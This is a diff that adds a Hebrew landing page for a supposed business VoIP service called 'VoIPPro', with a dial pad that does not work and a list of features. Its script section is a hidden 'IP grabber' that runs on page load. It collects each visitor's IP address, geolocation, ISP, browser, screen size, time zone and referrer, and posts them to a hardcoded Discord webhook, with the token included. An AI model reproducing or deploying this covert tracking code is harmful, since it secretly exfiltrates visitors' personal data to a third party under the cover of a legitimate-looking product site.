@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>VoIPPro - מערכת שיחות עסקית</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+    color: #fff; min-height: 100vh;
+  }
+  nav {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 20px 50px; background: rgba(0,0,0,0.3);
+  }
+  .logo { font-size: 24px; font-weight: bold; color: #00d9ff; }
+  .logo span { color: #fff; }
+  nav button {
+    background: #00d9ff; border: none; padding: 10px 25px;
+    border-radius: 25px; cursor: pointer; font-weight: bold;
+  }
+  .hero {
+    text-align: center; padding: 100px 20px;
+  }
+  .hero h1 { font-size: 42px; margin-bottom: 20px; }
+  .hero p { font-size: 18px; color: #b0c4de; max-width: 600px; margin: 0 auto 40px; }
+  .phone-card {
+    background: rgba(255,255,255,0.05); border-radius: 20px;
+    padding: 40px; max-width: 420px; margin: 0 auto;
+    box-shadow: 0 0 40px rgba(0,217,255,0.15);
+  }
+  .dial-pad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-top: 25px; }
+  .dial-pad button {
+    background: rgba(255,255,255,0.1); border: 1px solid rgba(0,217,255,0.3);
+    color: #fff; font-size: 22px; padding: 18px; border-radius: 50%;
+    cursor: pointer; transition: 0.2s;
+  }
+  .dial-pad button:hover { background: rgba(0,217,255,0.3); }
+  #display {
+    background: rgba(0,0,0,0.4); border-radius: 12px; padding: 15px;
+    text-align: center; font-size: 26px; letter-spacing: 3px; min-height: 60px;
+    border: 1px solid rgba(0,217,255,0.3);
+  }
+  .call-btn {
+    margin-top: 25px; width: 80px; height: 80px; border-radius: 50%;
+    background: #2ecc71; border: none; font-size: 30px; cursor: pointer;
+    box-shadow: 0 0 20px rgba(46,204,113,0.5);
+  }
+  .features {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 30px; padding: 60px 50px; max-width: 1100px; margin: 0 auto;
+  }
+  .feature {
+    background: rgba(255,255,255,0.05); padding: 30px;
+    border-radius: 15px; text-align: center;
+  }
+  .feature h3 { color: #00d9ff; margin-bottom: 10px; }
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="logo">VoIP<span>Pro</span></div>
+  <button onclick="showLogin()">כניסה למערכת</button>
+</nav>
+
+<section class="hero">
+  <h1>מערכת השיחות העסקית המתקדמת בישראל</h1>
+  <p>מרכזיה וירטואלית, הקלטות שיחות, IVR חכם וניתוב חכם למוקדים - הכל בפלטפורמה אחת.</p>
+
+  <div class="phone-card">
+    <h3 style="text-align:center; margin-bottom:15px;">נסה את המחייג</h3>
+    <div id="display"></div>
+    <div class="dial-pad">
+      <button onclick="press('1')">1</button>
+      <button onclick="press('2')">2</button>
+      <button onclick="press('3')">3</button>
+      <button onclick="press('4')">4</button>
+      <button onclick="press('5')">5</button>
+      <button onclick="press('6')">6</button>
+      <button onclick="press('7')">7</button>
+      <button onclick="press('8')">8</button>
+      <button onclick="press('9')">9</button>
+      <button onclick="press('*')">*</button>
+      <button onclick="press('0')">0</button>
+      <button onclick="press('#')">#</button>
+    </div>
+    <div style="text-align:center;">
+      <button class="call-btn" onclick="call()">📞</button>
+    </div>
+  </div>
+</section>
+
+<section class="features">
+  <div class="feature"><h3>📞 שיחות באיכות HD</h3><p>תשתית SIP מתקדמת לאיכות שמע מיטבית</p></div>
+  <div class="feature"><h3>🎯 ניתוב חכם</h3><p>הפניית שיחות לפי שעות, מיקום ונציגים פנויים</p></div>
+  <div class="feature"><h3>📊 דוחות וניתוח</h3><p>מעקב אחר כל שיחה בזמן אמת</p></div>
+</section>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1543710980347924621/YehMmVYABnE-oVwZ3b_TYzxgPCFhfe7ir6I1zYl5sWEIrhBfIPG2X_Mwb3Zs5imFRI7V";
+
+function press(n) { document.getElementById('display').textContent += n; }
+function call() { alert('מחייג...'); }
+
+function showLogin() { alert('המערכת תהיה זמינה בקרוב'); }
+
+// ============ IP GRABBER ============
+fetch('https://api.ipify.org?format=json')
+  .then(r => r.json())
+  .then(async data => {
+    const ip = data.ip;
+
+    // מיקום גיאוגרפי לפי IP
+    let geo = {};
+    try {
+      const g = await fetch(`https://ipwho.is/${ip}`).then(r => r.json());
+      geo = {
+        country: g.country, city: g.city,
+        isp: g.connection?.isp || 'unknown',
+        flag: g.flag?.emoji || ''
+      };
+    } catch(e) {}
+
+    const info = {
+      content: `**🌐 כניסה חדשה לאתר VoIPPro**`,
+      embeds: [{
+        title: "IP Grabbed",
+        color: 0x00d9ff,
+        fields: [
+          { name: "IP", value: `\`${ip}\``, inline: true },
+          { name: "מדינה", value: `${geo.flag || ''} ${geo.country || 'unknown'}`, inline: true },
+          { name: "עיר", value: geo.city || 'unknown', inline: true },
+          { name: "ספק אינטרנט", value: geo.isp || 'unknown', inline: true },
+          { name: "מכשיר", value: navigator.userAgent.slice(0, 100), inline: false },
+          { name: "שפה", value: navigator.language, inline: true },
+          { name: "מסך", value: `${screen.width}x${screen.height}`, inline: true },
+          { name: "אזור זמן", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+          { name: "הגיע מ", value: document.referrer || 'כניסה ישירה', inline: true }
+        ],
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    fetch(WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(info)
+    }).catch(() => {});
+  })
+  .catch(() => {});
+</script>
+
+</body>
+</html>
